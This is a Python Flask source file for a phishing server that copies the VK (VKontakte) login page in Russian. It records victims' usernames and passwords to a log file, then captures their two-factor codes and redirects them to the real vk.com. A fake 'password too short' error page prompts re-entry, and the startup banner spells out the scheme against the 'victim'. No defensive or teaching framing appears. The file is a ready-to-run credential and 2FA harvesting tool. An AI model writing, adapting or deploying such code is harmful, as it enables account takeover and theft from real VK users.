from flask import Flask, request, send_file, redirect, render_template_string
import datetime
import time

app = Flask(__name__)

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/2fa')
def two_factor():
    return send_file('2fa.html')

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    code = request.form.get('code')
    user = request.form.get('username')
    
    if code and len(code) >= 4:
        with open('log.txt', 'a', encoding='utf-8') as f:
            dt = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{dt}] 2FA CODE: {code} | USER: {user}\n")
        
        print(f"[!] 2FA код перехвачен: {code} для пользователя: {user}")
        
        time.sleep(1.5)
        
        return redirect("https://vk.com")
    
    return "Неверный код подтверждения", 400

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    password = request.form.get('password')
    
    if not password or len(password) < 6:
        error_html = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ошибка | ВКонтакте</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Open Sans", "Helvetica Neue", "Segoe UI", sans-serif;
            background-color: #ebedf0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }}
        .login-container {{
            background-color: #ffffff;
            padding: 32px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 360px;
            text-align: center;
            box-sizing: border-box;
        }}
        .logo {{
            width: 44px;
            height: 44px;
            margin-bottom: 24px;
        }}
        h2 {{
            font-size: 20px;
            margin-bottom: 24px;
            font-weight: 500;
        }}
        .error-message {{
            background-color: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            border: 1px solid #ffcdd2;
        }}
        input {{
            width: 100%;
            padding: 12px 16px;
            margin-bottom: 12px;
            border: 1px solid #dce1e6;
            border-radius: 8px;
            background-color: #f2f3f5;
            font-size: 16px;
            box-sizing: border-box;
        }}
        input:focus {{
            outline: none;
            border-color: #0077ff;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background-color: #0077ff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
        }}
        button:hover {{
            background-color: #0066de;
        }}
        .footer-link {{
            margin-top: 24px;
            color: #818c99;
            font-size: 14px;
            text-decoration: none;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/f/f3/VK_Compact_Logo_%282021-present%29.svg" alt="VK">
        <h2>Вход ВКонтакте</h2>
        <div class="error-message">
            ⚠️ Неверный пароль. Пароль должен содержать не менее 6 символов.
        </div>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Телефон или почта" value="{0}" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
        <div style="margin-top: 20px;">
            <a href="#" class="footer-link">Забыли пароль?</a>
        </div>
    </div>
</body>
</html>
'''.format(user if user else '')
        return error_html, 400
    
    if user and password:
        with open('log.txt', 'a', encoding='utf-8') as f:
            dt = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{dt}] LOGIN: {user} | PASS: {password}\n")
        
        print(f"[!] Логин и пароль перехвачены: {user} | Длина пароля: {len(password)} символов")
        
        print(f"[*] Эмуляция проверки данных...")
        time.sleep(2)
        
        print(f"[*] Запрос 2FA кода для {user}...")
        return redirect(f"/2fa?username={user}")
    
    return "Ошибка ввода", 400

if __name__ == '__main__':
    print("=" * 50)
    print("СЕРВЕР ЗАПУЩЕН")
    print("=" * 50)
    print("Локальный доступ: http://127.0.0.1:5000")
    print("Доступ по сети: http://<ваш_IP>:5000")
    print("=" * 50)
    print("Схема работы:")
    print("1. Жертва вводит логин/пароль")
    print("2. После успеха -> запрос 2FA кода")
    print("3. Все данные пишутся в log.txt")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000)